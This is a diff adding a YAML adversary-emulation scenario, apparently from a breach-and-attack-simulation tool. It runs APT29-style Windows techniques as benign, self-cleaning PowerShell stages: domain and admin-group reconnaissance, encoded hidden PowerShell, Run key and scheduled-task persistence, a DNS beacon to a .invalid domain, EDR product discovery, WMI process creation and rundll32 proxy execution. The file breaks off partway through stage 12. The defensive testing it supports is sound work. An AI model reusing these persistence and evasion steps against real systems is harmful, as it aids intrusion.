@@ -1,0 +1,1227 @@
+﻿id: apt29-kill-chain-phase7
+product_line: killchain
+name: APT29 Kill Chain Phase 7 — Extended Windows Tradecraft (30 stages)
+description: >
+  NOTE: this is a parallel, independently-built 30-stage expansion of APT29 Windows
+  tradecraft, distinct from the separately-maintained apt29-kill-chain scenario and
+  the apt29-execution-evasion/persistence/credential-access/command-control/
+  collection-staging scenarios. Some technique coverage overlaps between the two;
+  this file was kept under its own id rather than merged, pending reconciliation.
+  See docs/apt29-phase7-mastery-qa-log.md.
+
+  Thirty-stage telemetry-safe emulation of APT29 (Cozy Bear / NOBELIUM) post-
+  compromise tradecraft on Windows. Based on CISA AA21-148A, Microsoft threat
+  intelligence, and SolarWinds-related DFIR reporting (2020-2022).
+
+  KILL CHAIN STAGES (post-initial-access — APT29 lives off the land):
+    1. Domain Recon       — nltest domain trust + account discovery (T1482, T1087.001)
+    2. Encoded PS Loader  — Base64-encoded PowerShell download cradle pattern (T1059.001)
+    3. Run Key Persistence — HKCU Run registry write + immediate self-delete (T1547.001)
+    4. Scheduled Task     — schtasks /create BAS-sim task, immediate /delete (T1053.005)
+    5. DNS C2 Beacon      — nslookup to RFC-6761 invalid domain (T1071.004)
+
+  SAFETY: No credential theft, no lateral movement payload, no real C2 channel.
+  Run key and scheduled task are created and deleted in the same step. DNS
+  query is nslookup only; no listener. All steps [BAS-SIM-APT29] tagged.
+  PRODUCTION-SAFE: all five stages run in telemetry mode.
+  Windows only.
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+tags:
+  - apt29
+  - cozy-bear
+  - nobelium
+  - kill-chain
+  - phase7
+  - t1482
+  - t1087
+  - t1059
+  - t1547
+  - t1053
+  - t1071
+  - mitre
+mitre_phases:
+  - discovery
+  - execution
+  - persistence
+  - command-and-control
+
+live_policy:
+  block_on_domain_controller: false
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Stage 1 — Domain Trust + Account Discovery (T1482 / T1087.001)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 1 — Domain Trust and Local Account Discovery (T1482 / T1087.001)"
+    technique_id: T1482
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Runs nltest /domain_trusts /all_trusts (domain recon) and net user (local account enumeration). Both are read-only. APT29 uses nltest extensively to map Active Directory trusts before lateral movement. Generates Sysmon EID 1 (nltest.exe, net.exe) and Security EID 4688."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1: nltest.exe /domain_trusts /all_trusts"
+      - "Sysmon EID 1: net.exe user"
+      - "Security EID 4688: nltest.exe + net.exe from powershell.exe parent"
+    detection:
+      - "EDR: nltest.exe domain trust enumeration  -  Sigma rule proc_creation_win_nltest_recon.yml"
+      - "SIEM: nltest.exe invoked from PowerShell — APT29/SolarWinds recon IOC"
+      - "EDR: net.exe user invoked from PowerShell parent  -  Sigma rule proc_creation_win_net_user_recon.yml"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $nltestOut = & nltest.exe /domain_trusts /all_trusts 2>&1 | Out-String
+      $netUserOut = & net user 2>&1 | Out-String
+      $domainJoined = $nltestOut -match 'Trusted DC Name|List of domain trusts'
+      $userCount = ([regex]::Matches($netUserOut, '^\S+', [System.Text.RegularExpressions.RegexOptions]::Multiline)).Count
+      Write-Output "EXEC T1482: domain trust probe: domain_joined=$domainJoined. nltest output length=$($nltestOut.Length) chars. APT29 Stage 1 reconnaissance. [BAS-SIM-APT29-S1]"
+      Write-Output "EXEC T1087.001: net user enumerated. Sysmon EID 1 (nltest.exe, net.exe) generated."
+      if ($nltestOut.Length -gt 0 -or $netUserOut.Length -gt 0) { Write-Output "FAIL: Domain trust and local account enumeration ran unimpeded. EDR should alert on nltest.exe from PowerShell parent (classic APT29 recon pattern)." } else { Write-Output "ERROR: nltest and net user produced no output, so enumeration did not run on this host." }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 2 — Encoded PowerShell Loader / Download Cradle (T1059.001)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 2 — Encoded PowerShell Download Cradle Simulation (T1059.001)"
+    technique_id: T1059.001
+    detection_profiles:
+      - windows_encoded_powershell
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Spawns powershell.exe -EncodedCommand with a benign Base64 payload that writes a [BAS-SIM] string to a temp file (no network connection). APT29 used SUNBURST/TEARDROP via encoded PS download cradles. Generates Sysmon EID 1 (powershell.exe -EncodedCommand) and ScriptBlock EID 4104."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1: powershell.exe -EncodedCommand (AMSI and ScriptBlock logging path)"
+      - "PowerShell EID 4104: ScriptBlock logging captures decoded payload"
+      - "Security EID 4688: child powershell.exe with -EncodedCommand argument"
+    detection:
+      - "EDR: powershell.exe -EncodedCommand from PowerShell parent  -  Sigma rule proc_creation_win_powershell_encoded_param.yml"
+      - "SIEM: EID 4104 ScriptBlock containing encoded command — APT29 loader IOC"
+      - "AMSI: encoded payload decoded at runtime triggers AMSI scan"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $outFile = Join-Path $env:TEMP "bas_apt29_cradle_$runId.txt"
+      # Benign payload: writes a BAS-SIM string to a temp file (no net egress)
+      $payload = 'Write-Output "[BAS-SIM-APT29-S2] encoded PS loader simulation, run ' + $runId + '" | Out-File -FilePath "' + $outFile + '" -Encoding utf8'
+      $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
+      $Error.Clear()
+      $child = Start-Process powershell.exe -ArgumentList "-NoProfile","-NonInteractive","-EncodedCommand",$encoded -Wait -PassThru -WindowStyle Hidden
+      $launchErr = if ($Error.Count -gt 0) { [string]$Error[0] } else { '' }
+      $landed = Test-Path $outFile
+      Remove-Item $outFile -Force -ErrorAction SilentlyContinue
+      if ($child -and $child.ExitCode -eq 0) {
+        Write-Output "EXEC T1059.001: -EncodedCommand child process spawned (PID=$($child.Id), exit=0), payload landed=$landed, cleaned up. APT29 SUNBURST loader pattern. Sysmon EID 1 + ScriptBlock EID 4104 expected. [BAS-SIM-APT29-S2]"
+        Write-Output "FAIL: Encoded PS cradle ran without AMSI or Constrained Language Mode blocking it. Ensure AMSI logging is enabled and EID 4104 ScriptBlock logging is forwarded to SIEM."
+      } elseif ($null -eq $child) {
+        if ($launchErr -match 'blocked by|AppLocker|Constrained Language|AMSI|Defender|group policy|administrator has blocked|virus|malicious') { Write-Output "PASS: powershell.exe launch was refused by a control. [BAS-SIM-APT29-S2]" } else { Write-Output "ERROR: powershell.exe child could not be started and no control block was named, so the encoded cradle did not run. [BAS-SIM-APT29-S2]" }
+      } else {
+        Write-Output "PASS: Encoded PowerShell cradle blocked or failed  -  AMSI or execution policy prevented the child process (exit=$($child.ExitCode)). [BAS-SIM-APT29-S2]"
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_apt29_cradle_*') -Force -ErrorAction SilentlyContinue
+
+
+  # ---------------------------------------------------------------------------
+  # Stage 3 — Registry Run Key Persistence (T1547.001)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 3 — HKCU Run Key Persistence Write + Delete (T1547.001)"
+    technique_id: T1547.001
+    detection_profiles:
+      - windows_runkey_persistence
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Writes a HKCU Run key pointing to cmd.exe /c echo [BAS-SIM], then immediately deletes it. APT29 (SUNBURST/ENVYSCOUT) uses HKCU\\Run for user-level persistence without admin rights. Generates Sysmon EID 13 (registry set) + EID 14 (registry delete), Security EID 4657."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 13: registry value set — HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\BAS-Sim-APT29"
+      - "Sysmon EID 14: registry value deleted"
+      - "Security EID 4657: registry value written (if object-access auditing enabled)"
+    detection:
+      - "EDR: HKCU Run key write from PowerShell  -  Sigma rule registry_set_persistence_run_key.yml"
+      - "SIEM: EID 4657 HKCU\\Run write — user-level autorun persistence IOC"
+      - "EDR: registry key created then deleted within seconds — BAS or cleanup pattern, still loggable"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $keyPath = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
+      $valueName = 'BAS-Sim-APT29'
+      $valueData = 'cmd.exe /c echo [BAS-SIM-APT29-S3] persistence simulation'
+      Set-ItemProperty -Path $keyPath -Name $valueName -Value $valueData -ErrorAction SilentlyContinue
+      $written = (Get-ItemProperty -Path $keyPath -Name $valueName -ErrorAction SilentlyContinue).$valueName -eq $valueData
+      Remove-ItemProperty -Path $keyPath -Name $valueName -ErrorAction SilentlyContinue
+      $deleted = -not (Get-ItemProperty -Path $keyPath -Name $valueName -ErrorAction SilentlyContinue)
+      if ($written) {
+        Write-Output "EXEC T1547.001: HKCU\\Run key '$valueName' written (value=$valueData) then deleted=$deleted. APT29 uses this for user-level persistence on endpoints without admin. Sysmon EID 13+14 expected. [BAS-SIM-APT29-S3]"
+        Write-Output "FAIL: HKCU Run key written without EDR block. Registry persistence write should trigger an alert. Ensure Sysmon EID 13 is ingested and a detection rule covers HKCU\\Run new entries from PowerShell."
+      } else {
+        Write-Output "PASS: HKCU Run key write blocked  -  policy or EDR prevented registry persistence write. [BAS-SIM-APT29-S3]"
+      }
+    cleanup: |
+      Remove-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'BAS-Sim-APT29' -ErrorAction SilentlyContinue
+
+  # ---------------------------------------------------------------------------
+  # Stage 4 — Scheduled Task Persistence (T1053.005)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 4 — Scheduled Task Persistence Simulation (T1053.005)"
+    technique_id: T1053.005
+    detection_profiles:
+      - windows_schtask_persistence
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Creates a scheduled task named BAS-Sim-APT29 that runs cmd.exe /c echo [BAS-SIM] at next logon, then immediately deletes it. APT29 (EVILEYE/ENVYSCOUT) uses schtasks for persistence that survives reboots. Generates Security EID 4698 (task created) + 4699 (task deleted), Sysmon EID 1 schtasks.exe."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1: schtasks.exe /create + schtasks.exe /delete"
+      - "Security EID 4698: scheduled task created (BAS-Sim-APT29)"
+      - "Security EID 4699: scheduled task deleted"
+      - "Microsoft-Windows-TaskScheduler/Operational EID 106: task registered"
+    detection:
+      - "EDR: schtasks.exe /create from PowerShell parent  -  Sigma rule proc_creation_win_schtasks_persistence.yml"
+      - "SIEM: Security EID 4698 new scheduled task — persistence IOC; EID 4699 immediate delete — BAS-aware suppression may fire"
+      - "EDR: task action cmd.exe with echo argument — low-fidelity but loggable"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $taskName = 'BAS-Sim-APT29'
+      & schtasks.exe /create /tn $taskName /tr 'cmd.exe /c echo [BAS-SIM-APT29-S4]' /sc onlogon /f 2>&1 | Out-Null
+      $created = & schtasks.exe /query /tn $taskName 2>&1 | Out-String
+      $exists = $created -match $taskName
+      & schtasks.exe /delete /tn $taskName /f 2>&1 | Out-Null
+      $deleted = -not (& schtasks.exe /query /tn $taskName 2>&1 | Out-String -match $taskName)
+      if ($exists) {
+        Write-Output "EXEC T1053.005: scheduled task '$taskName' created (onlogon trigger, cmd.exe /c echo) then deleted=$deleted. APT29 uses schtasks for reboot-persistent implant loading. Security EID 4698+4699 expected. [BAS-SIM-APT29-S4]"
+        Write-Output "FAIL: Scheduled task creation ran unblocked. Ensure EID 4698 forwards to SIEM and triggers a P2 alert for new tasks outside of change windows. AppLocker or WDAC should inspect the task action binary."
+      } else {
+        Write-Output "PASS: schtasks.exe blocked or failed  -  AppLocker/WDAC/EDR prevented scheduled task creation. [BAS-SIM-APT29-S4]"
+      }
+    cleanup: |
+      & schtasks.exe /delete /tn 'BAS-Sim-APT29' /f 2>&1 | Out-Null
+
+  # ---------------------------------------------------------------------------
+  # Stage 5 — DNS C2 Beacon Pattern (T1071.004)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 5 — DNS C2 Beacon Simulation (T1071.004)"
+    technique_id: T1071.004
+    detection_profiles:
+      - windows_dns_c2
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Issues nslookup query to a deterministic BAS-owned domain (bas-sim-apt29-<runid>.invalid — RFC 6761 guaranteed non-routable) to generate DNS telemetry identical to APT29 SUNBURST beaconing pattern. No real C2. Generates Sysmon EID 22 (DNS query) and network EID 3 (UDP 53)."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 22: DNS query bas-sim-apt29-<runid>.invalid (APT29 beacon pattern)"
+      - "Sysmon EID 3: UDP port 53 to DNS resolver"
+      - "DNS server log: query for *.invalid BAS domain"
+    detection:
+      - "SIEM: DNS queries to *.invalid TLD from endpoint  -  RFC 6761, these should never succeed; flag at SIEM"
+      - "EDR: nslookup spawned by PowerShell  -  Sigma rule proc_creation_win_susp_dns_via_nslookup.yml"
+      - "DNS RPZ: recursive DNS should NXDOMAIN *.invalid — if it resolves, DNS is misconfigured"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $beaconDomain = "bas-sim-apt29-$runId.invalid"
+      $nsOut = & nslookup.exe $beaconDomain 2>&1 | Out-String
+      $resolved = $nsOut -match ('Name:\s+' + [regex]::Escape($beaconDomain))
+      $timedOut = $nsOut -match 'timed out|no servers could be reached'
+      $nxdomain = $nsOut -match "Non-existent domain"
+      Write-Output "EXEC T1071.004: DNS C2 beacon simulation sent nslookup $beaconDomain. resolved=$resolved (expected: false for RFC6761 .invalid). APT29 SUNBURST used avsvmcloud.com subdomain beacons in same pattern. Sysmon EID 22 expected. [BAS-SIM-APT29-S5]"
+      if ($timedOut -and -not $resolved) {
+        Write-Output "ERROR: DNS server timed out; NXDOMAIN could not be judged on this host. [BAS-SIM-APT29-S5]"
+      } elseif (-not $resolved -and -not $nxdomain) {
+        Write-Output "ERROR: DNS response was neither an answer nor NXDOMAIN (for example SERVFAIL or REFUSED), so NXDOMAIN was not observed. [BAS-SIM-APT29-S5]"
+      } elseif ($resolved) {
+        Write-Output "FAIL: DNS query to .invalid domain resolved — DNS RPZ or NXDOMAIN filtering is NOT in place. This means a real APT29 DGA domain could succeed. Deploy DNS firewall / RPZ to block *.invalid lookups."
+      } else {
+        Write-Output "PASS: .invalid domain returned NXDOMAIN as expected. DNS beacon simulation generated telemetry (Sysmon EID 22) for SIEM verification without real C2 channel. [BAS-SIM-APT29-S5]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # PHASE 7 — DISCOVERY CLUSTER (stages 6-10)
+  # ---------------------------------------------------------------------------
+
+  # ---------------------------------------------------------------------------
+  # Stage 6 — Domain Privileged Group Enumeration (T1069.002)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 6 — Domain Privileged Group Enumeration (T1069.002)"
+    technique_id: T1069.002
+    detection_profiles: [windows_apt29_discovery]
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Enumerates membership of Domain Admins and Enterprise Admins via net.exe. Read-only; no group membership is changed. APT29 routinely enumerates privileged groups before selecting a lateral-movement target. Generates Sysmon EID 1 (net.exe) and Security EID 4661/4662 if object-access auditing is enabled."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1: net.exe group \"Domain Admins\" /domain"
+      - "Security EID 4661/4662: directory object access (if object-access auditing enabled)"
+    detection:
+      - "EDR: net.exe group enumeration against a privileged group  -  Sigma rule proc_creation_win_net_group_recon.yml"
+      - "SIEM: repeated privileged-group queries from one host — APT29 target-selection IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $daOut = & net group "Domain Admins" /domain 2>&1 | Out-String
+      $eaOut = & net group "Enterprise Admins" /domain 2>&1 | Out-String
+      $enumerated = ($daOut -match 'Domain Admins' -or $eaOut -match 'Enterprise Admins')
+      Write-Output "EXEC T1069.002: privileged-group enumeration (Domain Admins, Enterprise Admins) ran. enumerated=$enumerated. APT29 Stage 6 target-selection recon. Sysmon EID 1 (net.exe) expected. [BAS-SIM-APT29-S6]"
+      if ($enumerated) {
+        Write-Output "FAIL: Privileged-group enumeration ran unimpeded. EDR/SIEM should alert on net.exe group queries against Domain/Enterprise Admins from a non-admin workstation."
+      } else {
+        Write-Output "PASS: Privileged-group enumeration blocked or returned nothing  -  policy, firewall, or lack of domain connectivity prevented it. [BAS-SIM-APT29-S6]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 7 — Domain Controller Discovery (T1018)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 7 — Domain Controller Discovery (T1018)"
+    technique_id: T1018
+    detection_profiles: [windows_apt29_discovery]
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Lists domain controllers via nltest /dclist. Read-only. APT29 maps DC topology before planning lateral movement or DCSync. Generates Sysmon EID 1 (nltest.exe)."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1: nltest.exe /dclist:<domain>"
+    detection:
+      - "EDR: nltest.exe /dclist invoked from PowerShell  -  Sigma rule proc_creation_win_nltest_dclist.yml"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $domain = (Get-WmiObject Win32_ComputerSystem).Domain
+      $dcOut = & nltest.exe /dclist:$domain 2>&1 | Out-String
+      $found = $dcOut -match 'List of domain controllers'
+      Write-Output "EXEC T1018: domain controller discovery via nltest /dclist:$domain ran. dc_list_found=$found. Sysmon EID 1 (nltest.exe) expected. [BAS-SIM-APT29-S7]"
+      if ($found) {
+        Write-Output "FAIL: Domain controller enumeration ran unimpeded. EDR should alert on nltest.exe /dclist from a non-admin workstation."
+      } else {
+        Write-Output "PASS: Domain controller discovery blocked or returned nothing. [BAS-SIM-APT29-S7]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 8 — Remote System Discovery (T1018), SKIP-gated on a configured target
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 8 — Remote System Discovery (T1018)"
+    technique_id: T1018
+    detection_profiles: [windows_apt29_discovery]
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Read-only reachability/name-resolution check against a single operator-configured remote host ($env:BAS_APT29_TARGET_HOST). No remote share, service, or session is touched (that is stages 24-26). SKIPs with an explicit reason when no target is configured, never silently passes. Generates Sysmon EID 1 (Test-Connection) and EID 22 (DNS query) against the target only."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1: Test-Connection against $env:BAS_APT29_TARGET_HOST"
+      - "Sysmon EID 22: DNS resolution of the target host"
+    detection:
+      - "EDR: ICMP/DNS probe of an internal host from PowerShell  -  Sigma rule proc_creation_win_susp_remote_discovery.yml"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $target = $env:BAS_APT29_TARGET_HOST
+      if ([string]::IsNullOrWhiteSpace($target)) {
+        Write-Output "SKIP: APT29 Stage 8 (Remote System Discovery) not run  -  no remote target host configured (`$env:BAS_APT29_TARGET_HOST unset). This step requires a second reachable host; configure the env var to run it. [BAS-SIM-APT29-S8]"
+      } else {
+        $reachable = Test-Connection -ComputerName $target -Count 1 -Quiet -ErrorAction SilentlyContinue
+        Write-Output "EXEC T1018: remote system discovery against configured target '$target'. reachable=$reachable. Sysmon EID 1+22 expected. [BAS-SIM-APT29-S8]"
+        if ($reachable) {
+          Write-Output "FAIL: Remote host reachability probe succeeded unimpeded. EDR should alert on unsolicited ICMP probing of internal hosts from a workstation."
+        } else {
+          Write-Output "PASS: Remote host reachability probe blocked or target unreachable. [BAS-SIM-APT29-S8]"
+        }
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 9 — Security Product Discovery (T1518.001)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 9 — Security Product Discovery (T1518.001)"
+    technique_id: T1518.001
+    detection_profiles: [windows_apt29_discovery]
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Read-only enumeration of installed AV/EDR products via the SecurityCenter2 WMI namespace and a literal-name comparison against the running process list. No process is queried for memory, killed, or tampered with — that is stage 14's different technique. Generates Sysmon EID 1 (WMI query) only."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1/WMI query: root/SecurityCenter2 AntiVirusProduct enumeration"
+    detection:
+      - "EDR: enumeration of its own product via WMI SecurityCenter2  -  Sigma rule proc_creation_win_security_software_discovery.yml"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $avProducts = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
+      $cimOk = $?
+      $knownEdrNames = @('MsMpEng', 'CSFalconService', 'SentinelAgent', 'cb', 'xagt', 'TaniumClient')
+      $runningEdr = Get-Process -ErrorAction SilentlyContinue | Where-Object { $knownEdrNames -contains $_.ProcessName }
+      $found = ($avProducts.Count -gt 0) -or ($runningEdr.Count -gt 0)
+      Write-Output "EXEC T1518.001: security product discovery via SecurityCenter2 WMI + process-name comparison. products_found=$found. Sysmon WMI-query telemetry expected. [BAS-SIM-APT29-S9]"
+      if ($cimOk) { Write-Output "FAIL: Security product discovery ran unimpeded. EDR should alert on a non-admin process enumerating root/SecurityCenter2." } else { Write-Output "ERROR: SecurityCenter2 query failed, so product discovery did not run on this host." }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 10 — Network Configuration Discovery (T1016)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 10 — Network Configuration Discovery (T1016)"
+    technique_id: T1016
+    detection_profiles: [windows_apt29_discovery]
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Read-only network configuration enumeration (ipconfig /all, routing table, ARP cache). No setting is changed. Generates Sysmon EID 1 (ipconfig.exe, arp.exe)."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1: ipconfig.exe /all"
+      - "Sysmon EID 1: arp.exe -a"
+    detection:
+      - "EDR: ipconfig.exe /all + arp.exe -a from PowerShell parent  -  Sigma rule proc_creation_win_netconfig_recon.yml"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $ipOut = & ipconfig.exe /all 2>&1 | Out-String
+      $routes = Get-NetRoute -ErrorAction SilentlyContinue
+      $arpOut = & arp.exe -a 2>&1 | Out-String
+      $enumerated = ($ipOut.Length -gt 0) -and ($routes.Count -gt 0 -or $arpOut.Length -gt 0)
+      Write-Output "EXEC T1016: network configuration discovery (ipconfig/all, routes, arp) ran. enumerated=$enumerated. Sysmon EID 1 expected. [BAS-SIM-APT29-S10]"
+      if ($ipOut.Length -gt 0) { Write-Output "FAIL: Network configuration enumeration ran unimpeded. EDR should alert on a workstation process querying its own full network configuration (low-fidelity alone, correlate with other recon stages)." } else { Write-Output "ERROR: ipconfig produced no output, so network configuration discovery did not run." }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # PHASE 7 — EXECUTION / DEFENSE-EVASION CLUSTER (stages 11-14)
+  # ---------------------------------------------------------------------------
+
+  # ---------------------------------------------------------------------------
+  # Stage 11 — WMI-Based Process Execution Simulation (T1047)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 11 — WMI-Based Process Execution Simulation (T1047)"
+    technique_id: T1047
+    detection_profiles: [windows_apt29_defense_evasion]
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Spawns a benign child process via WMI (Win32_Process Create) that only writes a [BAS-SIM] string to a temp file, then deletes it. The spawned command is powershell.exe -WindowStyle Hidden (not a bare cmd.exe) because Win32_Process.Create has no window-style parameter of its own -- a directly-spawned cmd.exe would otherwise flash a visible console window on an interactive desktop. APT29 and many intrusion sets use WMI process creation to evade process-tree-based detections tied to the parent shell. Generates Sysmon EID 1 with wmiprvse.exe as the parent."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1: powershell.exe child of WmiPrvSE.exe (WMI process creation)"
+    detection:
+      - "EDR: process created with WmiPrvSE.exe parent  -  Sigma rule proc_creation_win_wmi_process_create.yml"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $outFile = Join-Path $env:TEMP "bas_apt29_wmi_$runId.txt"
+      $payload = "Write-Output '[BAS-SIM-APT29-S11] wmi process execution simulation, run $runId' | Out-File -FilePath `"$outFile`" -Encoding utf8"
+      $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
+      $cmdLine = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand $encoded"
+      $Error.Clear()
+      $result = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $cmdLine }
+      $launchErr = if ($Error.Count -gt 0) { [string]$Error[0] } else { '' }
+      Start-Sleep -Milliseconds 800
+      $landed = Test-Path $outFile
+      Remove-Item $outFile -Force -ErrorAction SilentlyContinue
+      $spawned = ($result.ReturnValue -eq 0)
+      Write-Output "EXEC T1047: WMI process creation (Win32_Process.Create) spawned=$spawned (PID=$($result.ProcessId)), window hidden via powershell.exe -WindowStyle Hidden, payload landed=$landed, cleaned up. Sysmon EID 1 with WmiPrvSE.exe parent expected. [BAS-SIM-APT29-S11]"
+      if ($null -eq $result) {
+        if ($launchErr -match 'blocked by|AppLocker|Constrained Language|AMSI|Defender|group policy|administrator has blocked|virus|malicious') { Write-Output "PASS: Win32_Process.Create was refused by a control. [BAS-SIM-APT29-S11]" } else { Write-Output "ERROR: Win32_Process.Create failed and no control block was named, so the WMI stage did not run. [BAS-SIM-APT29-S11]" }
+      } elseif ($spawned) {
+        Write-Output "FAIL: WMI process execution ran without being blocked. Ensure EDR flags process creation whose parent is WmiPrvSE.exe, not just child-of-shell patterns."
+      } else {
+        Write-Output "PASS: WMI process creation blocked (Win32_Process.Create returned $($result.ReturnValue)). [BAS-SIM-APT29-S11]"
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_apt29_wmi_*') -Force -ErrorAction SilentlyContinue
+
+  # ---------------------------------------------------------------------------
+  # Stage 12 — Rundll32 Proxy Execution (T1218.011)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 12 — Rundll32 Proxy Execution (T1218.011)"
+    technique_id: T1218.011
+    detection_profiles: [windows_apt29_defense_evasion]
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Invokes rundll32.exe against a benign, already-present Windows system DLL export (advpack.dll, LaunchINFSection on a temporary empty INF, so no Control Panel or other window is opened). No custom or downloaded DLL is loaded. APT29 and many threat actors use rundll32.exe to proxy-execute a malicious DLL through a trusted signed binary. Generates Sysmon EID 1 (rundll32.exe)."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1: rundll32.exe advpack.dll,LaunchINFSection"
+    detection:
+      - "EDR: rundll32.exe spawned by powershell.exe with no visible UI result  -  Sigma rule proc_creation_win_rundll32_proxy_execution.yml"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $inf = Join-Path $env:TEMP ('bas_apt29_s12_' + [guid]::NewGuid().ToString('N').Substring(0,8) + '.inf')
+      Set-Content -LiteralPath $inf -Value @('[Version]', 'Signature="$CHICAGO$"', '[DefaultInstall]') -Encoding ASCII
+      $proc = Start-Process rundll32.exe -ArgumentList ('advpack.dll,LaunchINFSection "' + $inf + '",DefaultInstall,1,N') -PassThru -WindowStyle Hidden
+      if ($proc) { $proc | Wait-Process -Timeout 20 -ErrorAction SilentlyContinue }
+      Remove-Item -LiteralPath $inf -Force -ErrorAction SilentlyContinue
+      $ran = ($proc -and $proc.Id -gt 0)
+      Write-Output "EXEC T1218.011: rundll32.exe proxy execution against advpack.dll,LaunchINFSection (empty temporary INF, no UI) ran=$ran, exit=$($proc.ExitCode). Sysmon EID 1 (rundll32.exe) expected. [BAS-SIM-APT29-S12]"
+      if ($ran) {
